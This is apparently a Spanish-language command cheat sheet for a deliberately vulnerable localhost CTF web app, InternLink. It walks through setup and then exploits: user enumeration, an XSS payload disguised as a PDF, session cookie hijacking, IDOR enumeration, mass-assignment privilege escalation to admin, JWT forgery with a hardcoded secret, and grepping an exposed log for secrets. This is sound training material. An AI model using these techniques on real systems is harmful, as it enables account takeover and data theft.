# 🔧 Comandos Útiles - InternLink CTF

## 🚀 Instalación y Ejecución

### Crear y activar entorno virtual

**Windows PowerShell:**
```powershell
# Crear entorno virtual
python -m venv venv

# Activar
.\venv\Scripts\Activate.ps1

# Si hay error de permisos, ejecuta primero:
Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser
```

**Windows CMD:**
```cmd
python -m venv venv
venv\Scripts\activate.bat
```

**Linux/Mac:**
```bash
python3 -m venv venv
source venv/bin/activate
```

### Instalar dependencias
```bash
pip install -r requirements.txt
```

### Ejecutar aplicación
```bash
python app.py
```

---

## 🎯 Comandos para Explotar Vulnerabilidades

### ACTO 1: Enumeración de Usuarios

**Usando curl:**
```bash
curl -X POST http://localhost:5000/api/check-email \
  -H "Content-Type: application/json" \
  -d "{\"email\": \"admin@internlink.com\"}"
```

**Usando PowerShell:**
```powershell
Invoke-RestMethod -Uri "http://localhost:5000/api/check-email" `
  -Method POST `
  -ContentType "application/json" `
  -Body '{"email": "admin@internlink.com"}'
```

---

### ACTO 2: Preparar Payload XSS

**Renombrar archivo HTML a PDF:**

**Windows:**
```cmd
copy payloads\xss_cv.html cv_malicioso.pdf
```

**Linux/Mac:**
```bash
cp payloads/xss_cv.html cv_malicioso.pdf
```

---

### ACTO 3: Robar Sesión (JavaScript en DevTools)

```javascript
// Ver cookie actual
console.log(document.cookie);

// Inyectar cookie robada
document.cookie = "session_token=COOKIE_ROBADA_AQUI";
location.reload();
```

---

### ACTO 4: IDOR - Enumerar Empresas

**Usando curl:**
```bash
# Probar diferentes company_id
for i in {1..10}; do
  curl -s "http://localhost:5000/api/company/candidates?company_id=$i" \
    -H "Cookie: session_token=TU_TOKEN"
done
```

**Usando PowerShell:**
```powershell
1..10 | ForEach-Object {
  Invoke-RestMethod -Uri "http://localhost:5000/api/company/candidates?company_id=$_" `
    -Headers @{"Cookie"="session_token=TU_TOKEN"}
}
```

---

### ACTO 5: Mass Assignment

**JavaScript (en DevTools):**
```javascript
// Escalar a coordinador
fetch('/api/profile/update', {
    method: 'PUT',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ role: 'coordinator' })
})
.then(r => r.json())
.then(console.log);

// Escalar a admin
fetch('/api/profile/update', {
    method: 'PUT',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ role: 'admin' })
})
.then(r => r.json())
.then(console.log);
```

**Usando curl:**
```bash
curl -X PUT http://localhost:5000/api/profile/update \
  -H "Content-Type: application/json" \
  -H "Cookie: session_token=TU_TOKEN" \
  -d '{"role": "admin"}'
```

---

### ACTO 6: Analizar Archivo Binario

**Descargar archivo:**
```bash
curl http://localhost:5000/exports/candidates \
  -H "Cookie: session_token=TU_TOKEN" \
  -o candidates
```

**Identificar tipo:**

**Linux/Mac:**
```bash
file candidates
# Output: candidates: Microsoft Excel 2007+
```

**Windows PowerShell:**
```powershell
Get-Content candidates -TotalCount 2 -Encoding Byte
# Buscar: 50 4B (PK) = ZIP/Office file
```

**Renombrar y abrir:**
```bash
# Linux/Mac
mv candidates candidates.xlsx
libreoffice candidates.xlsx

# Windows
ren candidates candidates.xlsx
start candidates.xlsx
```

---

### ACTO 7: Forjar JWT

**Usando el script incluido:**
```bash
python payloads/jwt_forge.py
```

**Usando Python directamente:**
```python
import jwt

token = jwt.encode(
    {'user_id': '999', 'email': 'hacker@test.com', 'role': 'admin'},
    'internlink2024',
    algorithm='HS256'
)
print(token)
```

**Usando jwt.io:**
1. Ve a https://jwt.io
2. Payload:
```json
{
  "user_id": "999",
  "email": "hacker@test.com",
  "role": "admin"
}
```
3. Secret: `internlink2024`
4. Copia el token generado

**Verificar token:**
```bash
curl -X POST http://localhost:5000/api/auth/verify-jwt \
  -H "Content-Type: application/json" \
  -d "{\"token\": \"TU_TOKEN_AQUI\"}"
```

---

### ACTO 8: Acceder a Logs

**Usando curl:**
```bash
curl http://localhost:5000/logs/debug.log
```

**Usando navegador:**
```
http://localhost:5000/logs/debug.log
```

**Buscar información sensible:**
```bash
curl -s http://localhost:5000/logs/debug.log | grep -i "secret\|password\|flag"
```

---

## 🛠️ Comandos de Desarrollo

### Ver logs de la aplicación en tiempo real

**Linux/Mac:**
```bash
tail -f logs/debug.log
```

**Windows PowerShell:**
```powershell
Get-Content logs\debug.log -Wait -Tail 20
```

### Limpiar base de datos Redis

**Usando redis-cli (si tienes Redis local):**
```bash
redis-cli FLUSHALL
```

**Reiniciar la aplicación** (Python recreará datos de ejemplo)

### Ver archivos subidos
```bash
ls static/uploads/
```

### Verificar estructura del proyecto
```bash
tree -L 2  # Linux/Mac con tree instalado
```

**Windows:**
```cmd
tree /F
```

---

## 🔍 Debugging

### Ver todas las rutas disponibles

Agrega esto temporalmente en `app.py`:
```python
@app.route('/routes')
def show_routes():
    import urllib
    output = []
    for rule in app.url_map.iter_rules():
        methods = ','.join(rule.methods)
        output.append(f"{rule.endpoint}: {rule.rule} [{methods}]")
    return '<br>'.join(output)
```

Luego visita: `http://localhost:5000/routes`

### Ver estado de Redis (si está instalado localmente)

```bash
redis-cli KEYS "*"
redis-cli GET "session:TOKEN"
redis-cli HGETALL "student:1"
```

### Probar endpoints con httpie (si está instalado)

```bash
# Instalar httpie
pip install httpie

# Usar
http POST localhost:5000/api/check-email email=test@test.com
http GET localhost:5000/api/company/candidates company_id==1 Cookie:session_token=TOKEN
```

---

## 📦 Exportar/Importar Datos

### Hacer backup de Redis (Upstash)

**Guardar todas las claves:**
```python
import redis
import json

# Conectar a Redis local o Upstash
r = redis.Redis(host='localhost', port=6379, decode_responses=True)

# Exportar todas las claves
backup = {}
for key in r.keys('*'):
    key_type = r.type(key)
    if key_type == 'string':
        backup[key] = r.get(key)
    elif key_type == 'hash':
        backup[key] = r.hgetall(key)

# Guardar a archivo
with open('redis_backup.json', 'w') as f:
    json.dump(backup, f, indent=2)
```

---

## 🧹 Limpieza

### Eliminar entorno virtual
```bash
# Primero desactivar
deactivate

# Luego eliminar carpeta
rm -rf venv  # Linux/Mac
rmdir /s venv  # Windows
```

### Limpiar archivos temporales
```bash
rm -rf __pycache__
rm -rf static/uploads/*
rm -rf logs/*.log
rm -rf data/*.xlsx
```

**Windows:**
```cmd
rmdir /s /q __pycache__
del /q static\uploads\*
del /q logs\*.log
del /q data\*.xlsx
```

---

## 📝 Notas Útiles

### Variables de entorno temporales

**Linux/Mac:**
```bash
export FLASK_ENV=development
export FLASK_DEBUG=1
python app.py
```

**Windows:**
```cmd
set FLASK_ENV=development
set FLASK_DEBUG=1
python app.py
```

### Ejecutar en puerto diferente

Edita la última línea de `app.py`:
```python
app.run(debug=True, host='0.0.0.0', port=5001)
```

### Acceder desde otra computadora en la red

1. Encuentra tu IP local:
   - Windows: `ipconfig`
   - Linux/Mac: `ifconfig` o `ip addr`

2. Asegúrate de que el firewall permita conexiones al puerto 5000

3. Accede desde otra PC: `http://TU_IP:5000`

---

## 🎓 Recursos Adicionales

### Herramientas Útiles

- **Burp Suite Community:** https://portswigger.net/burp/communitydownload
- **OWASP ZAP:** https://www.zaproxy.org/
- **jwt.io:** https://jwt.io
- **webhook.site:** https://webhook.site
- **Postman:** https://www.postman.com/downloads/
- **httpie:** https://httpie.io/

### Extensiones de Navegador

- **EditThisCookie:** Manipular cookies fácilmente
- **ModHeader:** Modificar headers HTTP
- **JSON Viewer:** Ver JSON formateado
- **Wappalyzer:** Identificar tecnologías web

---

**💡 Tip:** Guarda este archivo para referencia rápida durante el CTF!
